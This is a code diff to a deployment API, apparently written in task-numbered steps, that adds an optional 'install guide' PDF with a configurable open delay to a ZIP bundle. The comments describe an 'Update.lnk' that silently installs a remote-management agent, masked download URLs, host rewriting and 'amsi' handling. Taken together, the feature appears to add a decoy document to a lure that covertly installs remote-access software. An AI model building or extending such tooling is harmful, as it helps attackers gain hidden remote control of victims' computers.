@@ -37,10 +37,91 @@ const deploymentSchema = z.object({
   updateLinkName: z.string().trim().max(64).optional(),
   innerFolder: z.string().trim().max(64).optional(),
   zipName: z.string().trim().max(64).optional(),
+  // Task 77 (FIX 5) — optional guide PDF for the ZIP bundle (JSON transport
+  // only: `pdf` = base64 `data:application/pdf;base64,…` URL, `pdfName` = bare
+  // `*.pdf` entry name, `pdfDelaySec` = 0–120 open delay). All optional; absent
+  // = today's no-PDF zip, byte-identical. Deep validation (magic + size +
+  // name rules) happens below, mirroring the MSI PDF upload in this file.
+  pdf: z.string().trim().max(30 * 1024 * 1024).optional(),
+  pdfName: z.string().trim().max(64).optional(),
+  pdfDelaySec: z.coerce.number().int().min(0).max(120).optional(),
 });
 
 const MAX_PDF_BYTES = 20 * 1024 * 1024; // ≤20MB
 const MAX_ICO_BYTES = 500 * 1024; // ≤500KB, per the generator's contract
+const PDF_MAGIC = Buffer.from([0x25, 0x50, 0x44, 0x46]); // %PDF
+const INVALID_PDF_NAME = /[/\\:"\u0000-\u001f]/;
+
+/**
+ * Task 77 (FIX 5): validate the optional ZIP guide-PDF fields from the JSON
+ * body, mirroring the MSI PDF upload rules in this file + the generator's own
+ * `postBuildZip` PDF block. Returns the sanitized `{ pdfBase64, pdfName }` to
+ * forward (or `null` when no PDF was attached). Throws a Response-ready
+ * `{ status, message }` error object on any invalid input.
+ *
+ * Rules: `pdf` must be a base64 data URL (or raw base64) decoding to bytes
+ * starting with `%PDF`, ≤ 20 MB; `pdfName` (when present) must be a bare
+ * `*.pdf` name (no path separators / `..` / > 64 chars); `pdfDelaySec` 0–120
+ * (zod-coerced above). Malformed base64 → 400; oversize → 413 (matching the
+ * generator's own codes).
+ */
+function validateZipPdfFields(input: {
+  pdf?: string;
+  pdfName?: string;
+  pdfDelaySec?: number;
+}): { pdfBase64: string; pdfName?: string; pdfDelaySec?: number } | null {
+  const rawPdf = (input.pdf ?? "").trim();
+  const rawName = (input.pdfName ?? "").trim();
+  if (!rawPdf) {
+    if (rawName || input.pdfDelaySec !== undefined) {
+      throw {
+        status: 400,
+        message: "pdfName/pdfDelaySec require a pdf to be attached.",
+      };
+    }
+    return null;
+  }
+  const b64 = rawPdf.startsWith("data:")
+    ? rawPdf.replace(/^data:[^;]+;base64,/, "")
+    : rawPdf;
+  let bytes: Buffer;
+  try {
+    bytes = Buffer.from(b64, "base64");
+  } catch {
+    throw { status: 400, message: "The install guide must be a valid PDF file." };
+  }
+  // Reject empty/garbage base64 that decodes to nothing (Buffer.from never
+  // throws on bad alphabet — it truncates — so check round-trip length too).
+  if (bytes.length < 4 || b64.replace(/\s+/g, "").length < 8) {
+    throw { status: 400, message: "The install guide must be a valid PDF file." };
+  }
+  if (!bytes.subarray(0, 4).equals(PDF_MAGIC)) {
+    throw { status: 400, message: "The install guide must be a PDF file." };
+  }
+  if (bytes.length > MAX_PDF_BYTES) {
+    throw { status: 413, message: "The install guide must be under 20MB." };
+  }
+  let pdfName: string | undefined;
+  if (rawName) {
+    if (
+      !/\.pdf$/i.test(rawName) ||
+      INVALID_PDF_NAME.test(rawName) ||
+      rawName.includes("..") ||
+      rawName.length > 64
+    ) {
+      throw {
+        status: 400,
+        message: "The PDF name must be a bare *.pdf filename (no path).",
+      };
+    }
+    pdfName = rawName;
+  }
+  return {
+    pdfBase64: rawPdf,
+    ...(pdfName ? { pdfName } : {}),
+    ...(input.pdfDelaySec !== undefined ? { pdfDelaySec: input.pdfDelaySec } : {}),
+  };
+}
 
 /** Validates a single field from multipart form data against the zod schema. */
 function coerceField(
@@ -267,12 +348,29 @@ async function handleDeployment(request: Request) {
 
   // ZIP path: same generator service/secret as MSI (ZIP_GENERATOR_URL only
   // differs if a dedicated host is used). Gate first so an unconfigured
-  // generator fails gracefully, never crashes the request.
+  // generator fails gracefully, never crashes the request. Task 77 (FIX 5):
+  // validate the optional guide-PDF fields here (BEFORE any TRMM work, same
+  // as the MSI PDF above) so bad PDFs fail fast without orphaned sites.
+  let zipPdf: { pdfBase64: string; pdfName?: string; pdfDelaySec?: number } | null =
+    null;
   if (parsed.installMethod === "zip") {
     if (!env.zipGeneratorUrl || !env.msiGeneratorSecret) {
       return NextResponse.json(
         { error: "ZIP installer isn't available yet" },
         { status: 503 },
+      );
+    }
+    try {
+      zipPdf = validateZipPdfFields({
+        pdf: parsed.pdf,
+        pdfName: parsed.pdfName,
+        pdfDelaySec: parsed.pdfDelaySec,
+      });
+    } catch (e) {
+      const err = e as { status?: number; message?: string };
+      return NextResponse.json(
+        { error: err.message ?? "The install guide must be a valid PDF file." },
+        { status: err.status ?? 400 },
       );
     }
   }
@@ -351,6 +449,11 @@ async function handleDeployment(request: Request) {
       // (/clients/<uid>/deploy/ → the exe Update.lnk silently installs); the
       // --auth the agent needs to enroll is the deployment's knox token_key
       // (that is what /api/v3/installer/ actually validates). One agent per zip.
+      // Task 77 (FIX 5): the uploaded PDF is NEVER persisted in the DB or on
+      // this server's filesystem — it transits in-memory to the generator,
+      // which bakes it into jobs/<jobId>/output.zip and serves it through the
+      // SAME masked downloadUrl (<REDIRECT_BASE_URL>/d/<jobId>, same TTL) as a
+      // no-PDF zip. No new route, no new table, no separate PDF URL.
       const dep = await createDeployment({
         site: siteId,
         expiresAt,
@@ -381,6 +484,13 @@ async function handleDeployment(request: Request) {
           updateLinkName: parsed.updateLinkName,
           innerFolder: parsed.innerFolder,
           zipName: parsed.zipName,
+          // Task 77 (FIX 5): optional guide PDF — validated above; omitted
+          // entirely when null so the no-PDF flow stays byte-identical.
+          // Task 76 triage compliance: no flag changes made (H1-leaning /
+          // inconclusive — launcherMode/amsi/authToken/FIX-3 handling untouched).
+          ...(zipPdf ? { pdfBase64: zipPdf.pdfBase64 } : {}),
+          ...(zipPdf?.pdfName ? { pdfName: zipPdf.pdfName } : {}),
+          ...(zipPdf?.pdfDelaySec !== undefined ? { pdfDelaySec: zipPdf.pdfDelaySec } : {}),
         });
         // Task 74 defense-in-depth: an older generator (or any path that
         // ignores downloadHost) still mints dl.instaweb.top — rewrite to the
